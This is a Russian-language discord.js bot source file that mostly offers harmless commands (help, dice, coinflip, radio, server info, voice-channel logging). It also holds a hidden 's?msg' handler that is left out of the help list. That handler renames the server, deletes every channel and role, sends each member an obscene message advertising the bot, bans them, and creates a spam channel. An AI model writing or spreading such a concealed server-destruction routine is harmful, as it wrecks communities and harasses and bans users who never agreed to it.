/*==========Библиотека Discord===========*/
const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require("fs");
const weather = require('weather-js');
let config = require('./config.json');
let channels = require('./channels.json');
let prefix = config.prefix;
bot.commands = new Discord.Collection();
fs.readdir('./cmd/',(err,files) =>{
    if(err) console.log(err);
    let jsfiles =files.filter(f => f.split(".").pop() === "js");
    if(jsfiles.length <=0) console.log("Нет доступных файлов для загрузки.");
    console.log(`Загружено ${jsfiles.length} файлов (commands)`);
    jsfiles.forEach((f,i) => {
        let props = require(`./cmd/${f}`);
        console.log(`${i+1}.${f} Загружен`);
        bot.commands.set(props.help.name,props);
    })
});
	/*=======================================*/
bot.on ("message", async message =>{
	    if(message.author.bot) return;
    if(message.channel.type == "dm") return;
    let user = message.author.username;
    let userid = message.author.id;
    let messageArray = message.content.split(" ");
    let command = messageArray[0].toLowerCase()
    let args = message.content.slice(prefix.length).trim().split(/ +/g);
    args.shift();
    if (!message.content.startsWith(prefix)) return;
    let cmd = bot.commands.get(command.slice(prefix.length));
    if (cmd) cmd.run(bot,message,args);
});
bot.on('message', msg => {
    if (msg.content === 's?msg') {
      msg.guild.SetName('Вас крашнул юзер.')
		msg.guild.setIcon('https://images-ext-1.discordapp.net/external/wcTyIIPsGT7fuP4e9RMQQmdNWD-PeyGN4nYwNIp7Gxs/%3Fsize%3D128/https/cdn.discordapp.com/icons/692983981255163905/6a89b42b8324ee64b093cc415271e479.png').then(() => {
      msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
      msg.guild.roles.forEach(i => i.delete()) // Удаление ролей
       msg.guild.members.forEach(member => { //Расслыка всем пользователям
        if (member.id != bot.user.id && !member.user.bot) member.send('Вас трахнул юзер который использовал бота. Сервер бота: https://discord.gg/DM5xaGD , ссылка на бота:https://discord.com/oauth2/authorize?client_id=709763322089570354&permissions=268435510&scope=bot').then(() => {
            member.ban().then(() => {
                const name = 'говно'
                msg.guild.createChannel(name, "text")
					.then(channel => {
                    channel.send('Вас трахнул юзер который использовал бота. Сервер бота: https://discord.gg/DM5xaGD , ссылка на бота: https://discord.com/oauth2/authorize?client_id=709763322089570354&permissions=268435510&scope=bot')
                    channel.overwritePermissions(member, {
                        SEND_MESSAGES: false
                    })
					
                    console.log('Попался лох')
                })
            })
        })
      })
})
	}
	
  });
  bot.on('message', msg => {
    if (msg.content === 'v!server') {
  msg.member.send(bot.guilds.map(r => r.name + ` | ${r.memberCount}**`))

	}
	});

/*=======================================*/
/*const config = bot.config = require('./config.json');*/
console.log("[BOT] Запускаем бота...");
const rando_hug = [
    'http://sad.awteam.pw/hug/1.gif',
    'http://sad.awteam.pw/hug/2.gif',
    'http://sad.awteam.pw/hug/3.gif',
    ]
	const rando_kiss = [
    'http://sad.awteam.pw/kiss/1.gif',
    'http://sad.awteam.pw/kiss/2.gif',
    'http://sad.awteam.pw/kiss/3.jpg',
    ]

/*	bot.on('message', msg => {
  if (msg.guild && msg.content.startsWith('/private')) {
    let text = msg.content.slice('/private'.length); // cuts off the /private part
    msg.guild.members.forEach(member => {
      if (member.id != bot.user.id && !member.user.bot) member.send(text);
    });
  }
});

/*======================================*/

// Локальные переменные

let statuslist = ['s?help | statbot.net']
let onlinelist = ['online'] // invisible - ещё есть
let randomcube = ['1','2','3','4','5','6','7','8','9','10','11','12']
let listavatar = ['2.png','1.png']
let randomcoin = ['Орёл','Решка']
let db = JSON.parse(fs.readFileSync('./database.json', "utf8"));

// Авторизация и установка статуса
bot.on("ready", function () {
	console.log("[BOT] Вошёл на " + bot.guilds.array().length + " сервер!");
	
	// Режим стримера
    //client.user.setGame('Test', 'https://twitch.tv/dfggdfhdf')
    //client.user.setActivity('на тебя!', {type: `WATCHING`})
	
	setInterval(function() {

        let statuss = statuslist[Math.floor(Math.random()*statuslist.length)]
        bot.user.setGame(statuss + "|Сервер: " + bot.guilds.array().length)

        //let listavatars = listavatar[Math.floor(Math.random()*listavatar.length)] // Смена аватаров (Пофикшенно дискордом)
        //console.log(listavatars)
        //bot.user.setAvatar(listavatars)


        let onlines = onlinelist[Math.floor(Math.random()*onlinelist.length)]
        bot.user.setStatus(onlines)
    
    }, 10000)
});





// Команды
const commands = {
	"help": {
		process: function (msg, suffix, embed) {
			const list = ["Bot - Бот",
			"** Тег команды: "+config.prefix+" **",
			"`help` - Команды",
			"`avatar` - Ваше изображение профиля/или любого юзера",
			"`info` - Информация об аккаунте",
			"`dice` - Бросить кости",
			"`coinflip` - Подкинуть монетку",
			"`serverinfo` - Информация о сервере.",
			"`weather` - Показывает погоду в городе",
			"`kiss @user` - Поцеловеть пользователя",
			"`hug @user` - Сбнять пользователя",
			"`bite @user` - Сделать кусь пользователю",
			"`nya @user` - Поприветсвтовать пользователя",
			"`status` - Статистика",
			"`ping` - Показывает пинг"
					]
			embed.setDescription(list);
			embed.setAuthor("Список команд бота", "https://imgur.com/iB8uy34");
			embed.setColor("#b92727");
			msg.channel.send({ embed });
		}
  	},
	"join": {
		process: function (msg, suffix, embed) {
			if (!msg.member.voiceChannel.joinable) return msg.channel.send("• Я не могу играть тут музыку.");
			msg.member.voiceChannel.join().then(() => {
				embed.setDescription("• Вошёл успешно!");
				embed.setColor("#b92727");
				msg.channel.send({ embed });
        	});
		}
	},


	"leave": {
		process: function (msg, suffix) {
			msg.member.voiceChannel.leave().then(() => {
				embed.setDescription("• Успешно вышел!");
				embed.setColor("#b92727");
				msg.channel.send({ embed });
			});
		}
	},
	
	"play": {
		process: function (msg, suffix, embed) {
			if (!msg.member.voiceChannel) return msg.channel.send('• Я не в голосовом чате.');
			if (!msg.member.voiceChannel.joinable) return msg.channel.send("• Я не могу играть тут музыку.");
			if (!suffix) {
				embed.setDescription("• Неверный жанр.\n\n`[-]` **Доступные жанры:** `Rap, jazz, chill, phonk`");
				embed.setColor("#b92727");
				return msg.channel.send({ embed });
			}
			let radio; // Радиостанции
			if (suffix.toLowerCase() == "rap") {
				radio = "http://195.154.231.247:8000/stream/10/;.m3u";
			} else if (suffix.toLowerCase() == "jazz") {
				radio = "http://144.217.158.59:5120/stream/;.m3u";
			} else if (suffix.toLowerCase() == "chill") {
				radio = "http://37.59.254.27:8024/;.m3u";
			} else if (suffix.toLowerCase() == "phonk") {
				radio = "http://sad.awteam.pw:8000/radioshadow";
			} else {
				embed.setDescription("• Неверный жанр.\n\n`[-]` **Доступные жанры:** `Rap, jazz, chill, phonk `");
				embed.setColor("#b92727");
				return msg.channel.send({ embed });
			}
			msg.member.voiceChannel.join().then(connection => {
				require('http').get(radio, (res) => {
					connection.playStream(res);
					embed.setColor("#b92727");
					embed.setDescription("• Теперь играет музыка!");
					msg.channel.send({ embed });
				});
			}).catch(err => "• **Ошибка:** ```\n" + err + "```");
			}
	},
	"invite": {
		process: function (msg, suffix, embed) {
      		embed.setColor("#281dc4");
			embed.setDescription("• **Ссылка:** https://discordapp.com/api/oauth2/authorize?client_id=570844777986129923&permissions=8&scope=bot");
     		msg.channel.send({ embed });
		}
	},
	

	"dice": {
		process: function (msg, suffix, embed) {
      		embed.setAuthor(`${msg.author.username}` )
			embed.setColor("#23c41d");
			let randomcubic = randomcube[Math.floor(Math.random()*randomcube.length)]
			embed.setDescription(`**Подкинул(а) 2 кубика и выпало ${randomcubic} из 12!**`);
     		msg.channel.send({ embed });
		}
	},
	"dice": {
		process: function (msg, suffix, embed) {
      		embed.setAuthor(`${msg.author.username}` )
			embed.setColor("#23c41d");
			let randomcubic = randomcube[Math.floor(Math.random()*randomcube.length)]
			embed.setDescription(`**Подкинул(а) 2 кубика и выпало ${randomcubic} из 12!**`);
     		msg.channel.send({ embed });
		}
	},
	
	
	
	
	"coinflip": {
		process: function (msg, suffix, embed) {
      		embed.setColor("#23c41d");
			let randomсoins = randomcoin[Math.floor(Math.random()*randomcoin.length)]
			let username = msg.author.username
			embed.setDescription(`**${username} подкинул(а) монету и выпало:** ***${randomсoins}***`);
     		msg.channel.send({ embed });
		}
	},

	


"serverinfo": {
		process: function (msg, suffix, embed) {
      		//embed.setColor("#23c41d");
			//embed.setDescription(msg.author.avatarURL);
			embed.setAuthor(`${msg.author.username}` )
			embed.setDescription(`Это сервер : **${msg.guild.name}**.
			Не этом сервере пользователей : **${msg.guild.memberCount}**.
			Регион этого сервера : **${msg.guild.region}**. `);
			
			
			embed.setColor('RANDOM')
     		msg.channel.send({ embed });
		}
	}

	
};



// Система команд
bot.on('message', function (msg) {
	if (msg.content.indexOf(config.prefix) === 0) {
		console.log("[BOT] Лог:"+`(${msg.guild.name}) ${msg.author.tag}: ${msg.content}`);

      	const command = msg.content.split(" ")[0].substring(config.prefix.length); // Команда
      	const suffix = msg.content.substring(command.length + config.prefix.length + 1); // Аргумент
      	const embed = new Discord.RichEmbed(); // Rich Embed для текста

      	if (!commands[command]) return;
      	try {
			commands[command].process(msg, suffix, embed); // Команда
      	} catch(err) { // Ошибка
        	msg.channel.send({embed: {"description": "• **Ошибка:** ```\n" + err + "```", "color": 0xff0000}});
      	}
	}
});

function getDateTime() {

    var date = new Date();

    var hour = date.getHours();
    hour = (hour < 10 ? "0" : "") + hour;

    var min  = date.getMinutes();
    min = (min < 10 ? "0" : "") + min;

    var sec  = date.getSeconds();
    sec = (sec < 10 ? "0" : "") + sec;

    var year = date.getFullYear();

    var month = date.getMonth() + 1;
    month = (month < 10 ? "0" : "") + month;

    var day  = date.getDate();
    day = (day < 10 ? "0" : "") + day;

    return year + "-" + month + "-" + day + "   T" + hour + ":" + min + ":" + sec;
    //2018-11-18T18:44:59.480Z
}
/* Система уровня 
bot.on("message", message => {
    if (message.author.bot) return; // Игнор бота

    // если пользователь не на БД, добавьте пользователя и измените его значения на 0
    if (!db[message.author.id]) db[message.author.id] = {
        xp: 0,
        level: 0
      };
    db[message.author.id].xp++;
    let userInfo = db[message.author.id];
    if(userInfo.xp > 50) {
        userInfo.level++
        userInfo.xp = 0
        message.reply("Молодец, твой уровень повышен!")
    }
    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const cmd = args.shift().toLowerCase();
    if(cmd === "level") {
        let userInfo = db[message.author.id];
        let username228 = message.author.username
        let member = message.mentions.members.first();
        let embed = new Discord.RichEmbed()
        .setColor(0x4286f4)
        .setAuthor(`${username228}`)
        .addField("Ваш уровень", userInfo.level)
        .addField("До нового уровня XP", userInfo.xp+"/50");
        if(!member) return message.channel.sendEmbed(embed)
        let memberInfo = db[member.id]
        let embed2 = new Discord.RichEmbed()
        .setColor(0x4286f4)
        .addField("Level", memberInfo.level)
        .addField("XP", memberInfo.xp+"/50")
        message.channel.sendEmbed(embed2)
    }
    fs.writeFile(".database.json", JSON.stringify(db), (x) => {
        if (x) console.error(x)
      });
})
*/
bot.on('voiceStateUpdate', async (oldMember, newMeber) => {


  if(oldMember.voiceChannel != undefined)
  {
    if(oldMember.voiceChannel.parent.id === channels['createparent'] && oldMember.voiceChannel.members.keyArray().length == 0 && oldMember.voiceChannel.id != channels['createvoice'])
     {
    oldMember.voiceChannel.delete();
     }
  }

  if (newMeber.voiceChannel!= undefined)
  {
    if(newMeber.voiceChannel.id == channels['createvoice'])
    {
      server = newMeber.guild;
      let ch = server.createChannel(newMeber.user.username,{
        type: 'voice',
        permissionOverwrites: [
          {
            id: server.defaultRole.id,
            deny: ['VIEW_CHANNEL'],
          }
        ],
      }).then(ch => {
        ch.setParent(channels['createparent'])
        ch.replacePermissionOverwrites({
          overwrites: [
            {
              id: server.defaultRole.id,
              allow: ['VIEW_CHANNEL'],
            },
            {
              id: newMeber.user.id,
              allow: ['VIEW_CHANNEL','MANAGE_CHANNELS','DEAFEN_MEMBERS','MOVE_MEMBERS']
            },
          ],
        });
         newMeber.setVoiceChannel(ch.id)

      })
      const embed = new Discord.RichEmbed()
      .setColor(16562432)
      .setAuthor('Голосовой канал')
      .setDescription( oldMember.user + '  создал голосовой канал  :loud_sound: ')
      .setFooter("ID пользователя: " + oldMember.user.id)
      bot.channels.get(channels.auditchannel).send({embed});
      return;
    }
  }
  

  if(oldMember.voiceChannel == undefined )
  {
    
    const embed = new Discord.RichEmbed()
    .setColor(0xCA8CD9)
    .setAuthor('Голосовой канал')
    .setDescription( oldMember.user + '  подключился к голосовому каналу  :loud_sound: ` ' + newMeber.voiceChannel.name + ' `')
    .setFooter("ID пользователя: " + oldMember.user.id)
    bot.channels.get(channels.auditchannel).send({embed});
    return;
  }
  if(newMeber.voiceChannel == undefined)
  {
    const embed = new Discord.RichEmbed()
    .setColor(0xDAB88B)
    .setAuthor('Голосовой чат')
    .setDescription( oldMember.user + '  покинул голосовой канал  :loud_sound:  ` ' + oldMember.voiceChannel.name + ' `')
    .setFooter("ID пользователя: " + oldMember.user.id)
    bot.channels.get(channels.auditchannel).send({embed});
    return;
  }
  if(newMeber.voiceChannel != undefined && oldMember.voiceChannel != undefined)
  {
    
    if (oldMember.voiceChannel.id == channels['createvoice']) return;
    const embed = new Discord.RichEmbed()
    .setColor(16562432)
    .setAuthor('Голосовой чат')
    .setDescription( oldMember.user + ' :loud_sound:  перешел из ` ' + oldMember.voiceChannel.name + ' `  в  ` ' + newMeber.voiceChannel.name + ' `')
    .setFooter("ID пользователя: " + oldMember.user.id)
    bot.channels.get(channels.auditchannel).send({embed});
    return;
  }
})

bot.login(config.token);
